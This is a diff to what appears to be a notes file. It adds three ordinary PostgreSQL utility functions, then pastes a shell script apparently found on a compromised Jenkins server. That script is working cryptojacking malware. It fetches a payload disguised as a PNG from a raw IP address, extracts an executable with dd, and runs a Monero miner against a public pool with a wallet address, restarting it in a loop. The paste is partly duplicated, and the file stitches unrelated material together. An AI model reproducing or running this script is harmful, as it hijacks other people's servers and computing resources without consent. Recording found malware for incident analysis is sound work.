@@ -59,3 +59,208 @@ console.log(data.map(function(a){
 	}
 }));
 
+
+
+CREATE OR REPLACE FUNCTION fu_mgr_data(dt_in text)
+  RETURNS date AS
+$BODY$
+
+/*
+recebe uma data string e prepara para converter pada date()
+*/
+
+declare
+
+dt_out    text;
+
+begin
+
+    dt_out = dt_in;
+
+    --testa dia com uma posição só acrescenta 0 zero
+    if (substr (dt_out,2,1)='/') then
+       dt_out = '0' || dt_out;
+    end if;
+
+    --testa mes com uma posição só acrescenta 0 zero
+    if (substr (dt_out,5,1)='/') then
+       dt_out = substr (dt_out,1,3) || '0' || substr (dt_out,4,7);
+    end if;
+
+    if (trim (dt_out) = '') then
+  dt_out = null;
+    end if;
+
+    -- coloca no formato americano para postgres converter
+    if (substr (dt_out,3,1) = '/' and substr (dt_out,6,1) = '/') then
+  dt_out = substr (dt_out, 7,4) || '-' || substr (dt_out, 4,2) || '-' || substr (dt_out,1,2);
+    end if;
+    
+    return date (dt_out);    
+end ;
+$BODY$
+  LANGUAGE plpgsql IMMUTABLE STRICT
+  COST 100;
+ALTER FUNCTION fu_mgr_data(text)
+  OWNER TO jenkins;
+GRANT EXECUTE ON FUNCTION fu_mgr_data(text) TO jenkins;
+GRANT EXECUTE ON FUNCTION fu_mgr_data(text) TO public;
+GRANT EXECUTE ON FUNCTION fu_mgr_data(text) TO "gerir-me";
+
+
+CREATE OR REPLACE FUNCTION fu_mgr_camel(st_in text)
+  RETURNS text AS
+$BODY$
+
+/*
+recebe uma string e retorna a primeira de cada palavra maiuscula menos de das etc
+*/
+
+declare
+
+declare i   integer;
+declare j integer;
+st_out    text;
+
+begin
+
+    i = 1;
+  
+    st_out = st_in;
+
+    if (trim (st_out) = '' or st_out is null) then
+  return st_out;
+    end if;
+
+    st_out = upper (substr (st_out,1,1)) || lower (substr (st_out,2,40000));
+    
+    loop
+  j = position (' ' in substr (st_out,i,400000));
+  if (j > 0) then
+     st_out = substr (st_out,1,i+j-1) || upper (substr (st_out,i+j,1)) || substr (st_out, i+j+1,400000); 
+     --exit;
+     i = i + J + 1; 
+  else 
+     exit;
+  end if;
+
+    end loop;
+    
+    return st_out;    
+end ;
+$BODY$
+  LANGUAGE plpgsql IMMUTABLE STRICT
+  COST 100;
+ALTER FUNCTION fu_mgr_camel(text)
+  OWNER TO jenkins;
+GRANT EXECUTE ON FUNCTION fu_mgr_camel(text) TO jenkins;
+GRANT EXECUTE ON FUNCTION fu_mgr_camel(text) TO public;
+GRANT EXECUTE ON FUNCTION fu_mgr_camel(text) TO "gerir-me";
+
+
+
+CREATE OR REPLACE FUNCTION fu_mgr_charset(st_in text)
+  RETURNS text AS
+$BODY$
+
+/*
+recebe uma string e verifica caracteres estranhos
+*/
+
+declare
+
+declare i   integer;
+declare j integer;
+st_out    text;
+
+begin
+
+    i = 1;
+  
+    st_out = st_in;
+
+    if (trim (st_out) = '' or st_out is null) then
+  return st_out;
+    end if;
+
+    st_out = replace(st_out, '  ', ' '); 
+
+    st_out = replace(st_out, '?O', 'ÃO'); -- verificar se pode sempre
+    st_out = replace(st_out, '?ES', 'ÃES'); -- verificar se pode sempre
+    st_out = replace(st_out, 'ǁ', 'Á'); 
+    st_out = replace(st_out, 'Ǉǃ', 'ÇÃ'); 
+    st_out = replace(st_out, 'Ǉ', 'c'); 
+    st_out = replace(st_out, 'ǚ', 'Ú'); 
+    st_out = replace(st_out, 'ǉ', 'É'); 
+    st_out = replace(st_out, 'Ǔ', 'Ó'); 
+    st_out = replace(st_out, 'ǂ', 'Â'); 
+    st_out = replace(st_out, 'SǃO', 'SÃO'); 
+    st_out = replace(st_out, 'Ǎ', 'Í'); 
+    
+    return st_out;    
+end ;
+$BODY$
+  LANGUAGE plpgsql IMMUTABLE STRICT
+  COST 100;
+ALTER FUNCTION fu_mgr_charset(text)
+  OWNER TO jenkins;
+GRANT EXECUTE ON FUNCTION fu_mgr_charset(text) TO jenkins;
+GRANT EXECUTE ON FUNCTION fu_mgr_charset(text) TO public;
+GRANT EXECUTE ON FUNCTION fu_mgr_charset(text) TO "gerir-me";
+
+
+
+
+
+#!/bin/sh
+ps -fe|grep conns |grep -v grep
+if [ $? -ne 0 ]
+then
+echo "start process....."
+wget 104.156.239.160:8087/587b626883fdc.png -O /tmp/conn
+dd if=/tmp/conn skip=7664 bs=1 of=/tmp/conns
+chmod +x /tmp/conns
+nohup /tmp/conns  -B -a cryptonight -o stratum+tcp://xmr.crypto-pool.fr:3333 -u 44xdB6UmabC8R69V6jDj7q1zGyDzJ7ks5GJpLs3b2HpqWwWq2xbvLKiRjmX8e9oy7426goZG9kXRTgHj9SZPGzfiQYtbTw1 -p x >/dev/null 2>&1 &
+else
+root@prd-vilarika:/tmp# head -60 conn.sh
+#!/bin/sh
+ps -fe|grep conns |grep -v grep
+if [ $? -ne 0 ]
+then
+echo "start process....."
+wget 104.156.239.160:8087/587b626883fdc.png -O /tmp/conn
+dd if=/tmp/conn skip=7664 bs=1 of=/tmp/conns
+chmod +x /tmp/conns
+nohup /tmp/conns  -B -a cryptonight -o stratum+tcp://xmr.crypto-pool.fr:3333 -u 44xdB6UmabC8R69V6jDj7q1zGyDzJ7ks5GJpLs3b2HpqWwWq2xbvLKiRjmX8e9oy7426goZG9kXRTgHj9SZPGzfiQYtbTw1 -p x >/dev/null 2>&1 &
+else
+echo "runing....."
+fi
+
+sleepTime=20
+
+while [ 0 -lt 1 ]
+do
+    ps -fe| grep conns | grep -v grep 
+    if [ $? -ne 0 ]
+    then
+        echo "process not exists ,restart process now... "
+        wget 104.156.239.160:8087/587b626883fdc.png -O /tmp/conn
+        dd if=/tmp/conn skip=7664 bs=1 of=/tmp/conns
+        chmod +x /tmp/conns
+        nohup /tmp/conns -a cryptonight -o stratum+tcp://xmr.crypto-pool.fr:3333 -u 44xdB6UmabC8R69V6jDj7q1zGyDzJ7ks5GJpLs3b2HpqWwWq2xbvLKiRjmX8e9oy7426goZG9kXRTgHj9SZPGzfiQYtbTw1 -p x >/dev/null 2>&1 & 
+  echo "restart done ..... "
+    else
+        echo "process exists , sleep $sleepTime seconds "
+    fi
+    sleep $sleepTime
+done
+
+
+
+==============
+
+-rw-r--r-- 1 jenkins jenkins 1224816 May 14 16:55 conn
+-rwxr-xr-x 1 jenkins jenkins 1217152 May 14 16:55 conns
+-rwxr-xr-x 1 jenkins jenkins    1071 May 14 16:55 conn.sh
+
+
